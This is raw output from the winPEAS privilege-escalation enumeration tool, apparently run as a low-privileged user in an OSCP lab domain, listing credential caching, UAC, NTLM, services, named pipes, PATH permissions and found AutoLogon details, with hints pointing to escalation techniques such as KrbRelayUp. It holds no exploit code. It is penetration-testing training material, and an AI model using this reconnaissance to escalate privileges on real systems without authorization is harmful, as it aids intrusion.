    CredentialGuard is not enabled

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)

ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
  [X] Exception: Access denied
    No AV was detected!!
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
  Local Settings
  Group Policy Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy:
    FilterAdministratorToken:
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version:
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS history file:
    PS history size:

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
È Read the PS history inside these files (if any)

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
È Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
È If the binary cexecsvc.exe or associated service exists, you are inside Docker
You are NOT inside a container

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       700
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       6
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine
   Type             :     machine
   Display Name     :     Default Domain Policy
   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
   Link             :     LDAP://DC=oscp,DC=exam
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  MSSQL$SQLEXPRESS\sql\query                                                                           Everyone [WriteData/CreateFiles]                                       O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133G:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)

  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  SQLLocal\SQLEXPRESS                                                                                  Everyone [WriteData/CreateFiles]                                       O:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133G:S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133)

  vgauth-service                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2202.4-0\MpOav.dll"

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

  [X] Exception: Attempted to perform an unauthorized operation.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days

System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.
   at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)
   at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)
   at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)
   at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
   at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()
   at winPEAS.Checks.EventsInfo.PowerOnEvents()


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: celia.almeda
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Network, Authenticated Users, This Organization, NTLM Authentication
   =================================================================================================

    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
   Current User   :     OSCP\celia.almeda
   Idle Time      :     01h:37m:27s:046ms

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
È Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeTimeZonePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text

ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
  [X] Exception: Access denied
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   MS02
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   8/1/2023 7:00:51 AM
   Logons Count            :   28
   Password Last Set       :   3/25/2022 1:06:54 PM

   =================================================================================================

   Computer Name           :   MS02
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   MS02
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   MS02
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   11/19/2020 12:43:26 AM

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
  [X] Exception: Access denied
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\Administrator.OSCP
    C:\Users\All Users
    C:\Users\celia.almeda : celia.almeda [AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  OSCP.exam
    DefaultUserName               :  Administrator

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
È Check for a possible brute-force
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: MS02
    SID: S-1-5-21-2512333080-3128024849-3533006164
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
  [X] Exception: Access denied
    @amdgpio2.inf,%GPIO.SvcDesc%;AMD GPIO Client Driver(Advanced Micro Devices, Inc - @amdgpio2.inf,%GPIO.SvcDesc%;AMD GPIO Client Driver)[C:\Windows\System32\drivers\amdgpio2.sys] - System
   =================================================================================================

    @amdi2c.inf,%amdi2c.SVCDESC%;AMD I2C Controller Service(Advanced Micro Devices, Inc - @amdi2c.inf,%amdi2c.SVCDESC%;AMD I2C Controller Service)[C:\Windows\System32\drivers\amdi2c.sys] - System
   =================================================================================================

    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System
   =================================================================================================

    @net1ic64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ic64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i65x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver(Intel(R) Corporation - @iagpio.inf,%iagpio.SVCDESC%;Intel Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iagpio.sys] - System
   =================================================================================================

    @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller(Intel(R) Corporation - @iai2c.inf,%iai2c.SVCDESC%;Intel(R) Serial IO I2C Host Controller)[C:\Windows\System32\drivers\iai2c.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_SKL.inf,%iaLPSS2i_GPIO2.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_BXT_P.inf,%iaLPSS2i_GPIO2_BXT_P.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_BXT_P.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_CNL.inf,%iaLPSS2i_GPIO2_CNL.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_CNL.inf,%iaLPSS2i_GPIO2_CNL.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_CNL.sys] - System
   =================================================================================================

    @iaLPSS2i_GPIO2_GLK.inf,%iaLPSS2i_GPIO2_GLK.SVCDESC%;Intel(R) Serial IO GPIO Driver v2(Intel Corporation - @iaLPSS2i_GPIO2_GLK.inf,%iaLPSS2i_GPIO2_GLK.SVCDESC%;Intel(R) Serial IO GPIO Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_GPIO2_GLK.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_SKL.inf,%iaLPSS2i_I2C.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_BXT_P.inf,%iaLPSS2i_I2C_BXT_P.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_BXT_P.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_CNL.inf,%iaLPSS2i_I2C_CNL.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_CNL.inf,%iaLPSS2i_I2C_CNL.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_CNL.sys] - System
   =================================================================================================

    @iaLPSS2i_I2C_GLK.inf,%iaLPSS2i_I2C_GLK.SVCDESC%;Intel(R) Serial IO I2C Driver v2(Intel Corporation - @iaLPSS2i_I2C_GLK.inf,%iaLPSS2i_I2C_GLK.SVCDESC%;Intel(R) Serial IO I2C Driver v2)[C:\Windows\System32\drivers\iaLPSS2i_I2C_GLK.sys] - System
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver(VMware, Inc. - @oem5.inf,%pvscsi.DiskName%;pvscsi Storage Controller Driver)[System32\drivers\pvscsi.sys] - Boot
   =================================================================================================

    SQL Server Agent (SQLEXPRESS)(SQL Server Agent (SQLEXPRESS))["C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\SQLAGENT.EXE" -i SQLEXPRESS] - Manual
    Executes jobs, monitors SQL Server, fires alerts, and allows automation of some administrative tasks.
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - Manual
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload
    Alias Manager and Ticket Service
   =================================================================================================

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    @oem9.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem9.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System
   =================================================================================================

    VMware Tools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Autoload
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================

    @oem10.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem10.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot
    vSockets Driver
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files (x86)\Microsoft SQL Server\150\DTS\Binn\
    C:\Program Files\Azure Data Studio\bin
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\DTS\Binn\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\Azure Data Studio
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft Analysis Services
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\PCHealthCheck
    C:\Program Files\RUXIM
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
